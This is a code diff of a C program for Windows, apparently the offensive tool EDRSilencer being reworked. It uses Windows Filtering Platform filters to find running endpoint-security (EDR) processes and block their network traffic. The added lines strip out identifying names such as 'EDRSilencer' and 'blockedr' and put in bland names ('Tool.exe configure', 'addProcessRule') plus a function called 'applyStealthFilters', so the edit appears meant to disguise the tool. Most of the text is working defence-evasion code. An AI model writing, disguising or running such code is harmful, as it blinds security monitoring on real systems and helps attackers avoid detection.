-                    result = FwpmProviderAdd0(hEngine, &provider, NULL);
-                    if (result != ERROR_SUCCESS) {
-                        printf("    [-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (isProcessInList(pe32.szExeFile)) {
+                printf("[+] Found EDR process: %s\n", pe32.szExeFile);
+                WCHAR fullPath[MAX_PATH];
+                if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
+                    FWP_BYTE_BLOB* blob = NULL;
+                    if (CustomFwpmGetAppIdFromFileName0(fullPath, &blob) == CUSTOM_SUCCESS) {
+                        applyStealthFilters(hEngine, blob, &SubLayerGUID, fullPath);
+                        FwpmFreeMemory0((void**)&blob);
                     } else {
-                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
-                            filter.providerKey = &providerGuid;
-                        }
+                        printf("    [-] Failed to get AppID for %ls\n", fullPath);
                     }
                 }
-
-                // Add filter to both IPv4 and IPv6 layers
-                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-                if (result == ERROR_SUCCESS) {
-                    printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
-                } else {
-                    printf("    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
-                }
-                
-                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
-                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-                if (result == ERROR_SUCCESS) {
-                    printf("    Added WFP filter for \"%S\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
-                } else {
-                    printf("    [-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
-                }
-
-                FreeAppId(appId);
-                CloseHandle(hProcess);
-            } else {
-                printf("    [-] Could not open process \"%s\" with error code: 0x%x.\n", pe32.szExeFile, GetLastError());
             }
-        }
-    } while (Process32Next(hProcessSnap, &pe32));
-
-    if (!isEdrDetected) {
-        printf("[-] No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\n");
+        } while (Process32Next(hSnapshot, &pe32));
     }
-    CloseHandle(hProcessSnap);
-    FwpmEngineClose0(hEngine);
-    return;
+
+    CloseHandle(hSnapshot);
+    shutdownWfp(hEngine);
 }
 
-// Add block WFP filter to user-defined process
-void BlockProcessTraffic(char* fullPath) {
-    DWORD result = 0;
-    HANDLE hEngine = NULL;
-    WCHAR wFullPath[MAX_PATH] = {0};
-    DWORD size = MAX_PATH;
-    FWPM_FILTER_CONDITION0 cond = {0};
-    FWPM_FILTER0 filter = {0};
-    FWPM_PROVIDER0 provider = {0};
-    GUID providerGuid = {0};
-    FWP_BYTE_BLOB* appId = NULL;
-    UINT64 filterId = 0;
-    ErrorCode errorCode = CUSTOM_SUCCESS;
-    
-    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
-    if (result != ERROR_SUCCESS) {
-        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
-        return;
-    }
-    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));
-    errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);
-    if (errorCode != CUSTOM_SUCCESS) {
-        switch (errorCode) {
-            case CUSTOM_FILE_NOT_FOUND:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The file path cannot be found.\n", wFullPath);
-                break;
-            case CUSTOM_MEMORY_ALLOCATION_ERROR:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Error occurred in allocating memory for appId.\n", wFullPath);
-                break;
-            case CUSTOM_NULL_INPUT:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Please check your input.\n", wFullPath);
-                break;
-            case CUSTOM_DRIVE_NAME_NOT_FOUND:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. The drive name cannot be found.\n", wFullPath);
-                break;
-            case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:
-                printf("[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \"%S\" to app ID format. Failed to convert drive name to DOS device name.\n", wFullPath);
-                break;
-            default:
-                break;
-        }
-        return;
-    }
-
-    // Setting up WFP filter and condition
-    filter.displayData.name = filterName;
-    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;
-    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
-    filter.action.type = FWP_ACTION_BLOCK;
-    UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;
-    filter.weight.type = FWP_UINT64;
-    filter.weight.uint64 = &weightValue;
-    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
-    cond.matchType = FWP_MATCH_EQUAL;
-    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;
-    cond.conditionValue.byteBlob = appId;
-    filter.filterCondition = &cond;
-    filter.numFilterConditions = 1;
-
-    // Add WFP provider for the filter
-    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
-        filter.providerKey = &providerGuid;
-    } else {
-        provider.displayData.name = providerName;
-        provider.displayData.description = providerDescription;
-        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
-        result = FwpmProviderAdd0(hEngine, &provider, NULL);
-        if (result != ERROR_SUCCESS) {
-            printf("[-] FwpmProviderAdd0 failed with error code: 0x%x.\n", result);
-        } else {
-            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
-                filter.providerKey = &providerGuid;
-            }
-        }
-    }
-
-    // Add filter to both IPv4 and IPv6 layers
-    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-    if (result == ERROR_SUCCESS) {
-        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv4 layer).\n", fullPath, filterId);
-    } else {
-        printf("[-] Failed to add filter in IPv4 layer with error code: 0x%x.\n", result);
-    }
-
-    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
-    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);
-    if (result == ERROR_SUCCESS) {
-        printf("Added WFP filter for \"%s\" (Filter id: %d, IPv6 layer).\n", fullPath, filterId);
-    } else {
-        printf("[-] Failed to add filter in IPv6 layer with error code: 0x%x.\n", result);
-    }
-
-    FreeAppId(appId);
-    FwpmEngineClose0(hEngine);
-    return;
-}
-
-// Remove all WFP filters previously created
-void UnblockAllWfpFilters() {
+// Function to remove all rules
+void removeAllRules() {
     HANDLE hEngine = NULL;
     DWORD result = 0;
-    HANDLE enumHandle = NULL;
-    FWPM_FILTER0** filters = NULL;
-    GUID providerGuid = {0};
-    UINT32 numFilters = 0;
-    BOOL foundFilter = FALSE;
-    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
+
+    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
     if (result != ERROR_SUCCESS) {
-        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
+        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
         return;
     }
 
-    result = FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);
-    if (result != ERROR_SUCCESS) {
-        printf("[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x.\n", result);
-        return;
+    // By deleting the sublayer, all filters within that sublayer are automatically removed.
+    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
+    if (result == ERROR_SUCCESS) {
+        printf("[+] Sublayer and all associated filters removed successfully.\n");
+        } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
+        printf("[-] Sublayer not found. No rules to remove.\n");
+    } else {
+        printf("[-] FwpmSubLayerDeleteByKey0 failed. Error: 0x%lX\n", result);
     }
 
-    while(TRUE) {
-        result = FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);
-
-        if (result != ERROR_SUCCESS) {
-            printf("[-] FwpmFilterEnum0 failed with error code: 0x%x.\n", result);
-            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
-            FwpmEngineClose0(hEngine);
-            return;
-        }
-
-        if (numFilters == 0) {
-			break;
-        }
-        
-        FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;
-        WCHAR* currentFilterName = data->name;
-        if (wcscmp(currentFilterName, filterName) == 0) {
-            foundFilter = TRUE;
-            UINT64 filterId = filters[0]->filterId;
-            result = FwpmFilterDeleteById0(hEngine, filterId);
-            if (result == ERROR_SUCCESS) {
-                printf("Deleted filter id: %llu.\n", filterId);
-            } else {
-                printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
-            }
-        }
+    // After removing the sublayer, we can remove the provider.
+    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
+    if (result == ERROR_SUCCESS) {
+        printf("[+] Provider removed successfully.\n");
+        } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
+        printf("[-] Provider not found.\n");
+    } else {
+        printf("[-] FwpmProviderDeleteByKey0 failed. Error: 0x%lX\n", result);
     }
 
-    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
-        result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);
-        if (result != ERROR_SUCCESS) {
-            if (result != FWP_E_IN_USE) {
-                printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
-            }
-        } else {
-            printf("Deleted custom WFP provider.\n");
-        }
-    }
-
-    if (!foundFilter) {
-        printf("[-] Unable to find any WFP filter created by this tool.\n");
-    }
-    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
     FwpmEngineClose0(hEngine);
 }
 
-// Remove WFP filter based on filter id
-void UnblockWfpFilter(UINT64 filterId) {
+// Function to remove a rule by ID
+void removeRuleById(UINT64 ruleId) {
     HANDLE hEngine = NULL;
     DWORD result = 0;
-    GUID providerGuid = {0};
 
-    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);
+    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
     if (result != ERROR_SUCCESS) {
-        printf("[-] FwpmEngineOpen0 failed with error code: 0x%x.\n", result);
+        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
         return;
     }
-    
-    result = FwpmFilterDeleteById0(hEngine, filterId);
 
+    result = FwpmFilterDeleteById0(hEngine, ruleId);
     if (result == ERROR_SUCCESS) {
-        printf("Deleted filter id: %llu.\n", filterId);
-    }
-    else if (result == FWP_E_FILTER_NOT_FOUND) {
-        printf("[-] The filter does not exist.\n");
+        printf("[+] Rule with ID %llu removed successfully.\n", ruleId);
+        } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
+        printf("[-] Rule with ID %llu not found.\n", ruleId);
     } else {
-        printf("[-] Failed to delete filter id: %llu with error code: 0x%x.\n", filterId, result);
-    }
-
-    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {
-        result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);
-        if (result != ERROR_SUCCESS) {
-            if (result != FWP_E_IN_USE) {
-                printf("[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n", result);
-            }
-        } else {
-            printf("Deleted custom WFP provider.\n");
-        }
+        printf("[-] Failed to remove rule with ID %llu. Error: 0x%lX\n", ruleId, result);
     }
 
     FwpmEngineClose0(hEngine);
 }
 
-void PrintHelp() {
-    printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
-    printf("Version: 1.4\n");
-    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\n");
-    printf("  EDRSilencer.exe blockedr\n\n");
-    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\n");
-    printf("  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n");
-    printf("- Remove all WFP filters applied by this tool:\n");
-    printf("  EDRSilencer.exe unblockall\n\n");
-    printf("- Remove a specific WFP filter based on filter id:\n");
-    printf("  EDRSilencer.exe unblock <filter id>");
+void showHelp() {
+    printf("Usage: Tool.exe <command>\n");
+    printf("Version: 1.5\n\n");
+    printf("Commands:\n");
+    printf("  configure   - Add network rules to block traffic of all detected target processes.\n");
+    printf("  add <path>  - Add a network rule to block traffic for a specific process.\n");
+    printf("                Example: Tool.exe add \"C:\\Windows\\System32\\curl.exe\"\n");
+    printf("  removeall   - Remove all network rules applied by this tool.\n");
+    printf("  remove <id> - Remove a specific network rule by its ID.\n");
 }
 
 int main(int argc, char *argv[]) {
     if (argc < 2) {
-        PrintHelp();
+        showHelp();
         return 1;
     }
 
-    if (strcasecmp(argv[1], "-h") == 0 || strcasecmp(argv[1], "--help") == 0) {
-        PrintHelp();
+    if (_stricmp(argv[1], "-h") == 0 || _stricmp(argv[1], "--help") == 0) {
+        showHelp();
         return 1;
     }
     
@@ -460,38 +664,31 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    if (strcmp(argv[1], "blockedr") == 0) {
-        BlockEdrProcessTraffic();
-    } else if (strcmp(argv[1], "block") == 0) {
+    if (strcmp(argv[1], "configure") == 0) {
+        configureNetworkFilters();
+    } else if (strcmp(argv[1], "add") == 0) {
         if (argc < 3) {
-            printf("[-] Missing second argument. Please provide the full path of the process to block.\n");
+            printf("[-] Missing argument. Please provide the full path of the process.\n");
             return 1;
         }
-        BlockProcessTraffic(argv[2]);
-    } else if (strcmp(argv[1], "unblockall") == 0) {
-        UnblockAllWfpFilters();
-    } else if (strcmp(argv[1], "unblock") == 0) {
+        addProcessRule(argv[2]);
+    } else if (strcmp(argv[1], "removeall") == 0) {
+        removeAllRules();
+    } else if (strcmp(argv[1], "remove") == 0) {
         if (argc < 3) {
-            printf("[-] Missing argument for 'unblock' command. Please provide the filter id.\n");
+            printf("[-] Missing argument. Please provide the rule ID.\n");
             return 1;
         }
         char *endptr;
         errno = 0;
-
-        UINT64 filterId = strtoull(argv[2], &endptr, 10);
-
-        if (errno != 0) {
-            printf("[-] strtoull failed with error code: 0x%x.\n", errno);
+        UINT64 ruleId = strtoull(argv[2], &endptr, 10);
+        if (errno != 0 || endptr == argv[2]) {
+            printf("[-] Invalid rule ID provided.\n");
             return 1;
         }
-
-        if (endptr == argv[2]) {
-            printf("[-] Please provide filter id in digits.\n");
-            return 1;
-        }
-        UnblockWfpFilter(filterId);
+        removeRuleById(ruleId);
     } else {
-        printf("[-] Invalid argument: \"%s\".\n", argv[1]);
+        printf("[-] Invalid command: \"%s\". Use -h for help.\n", argv[1]);
         return 1;
     }
     return 0;
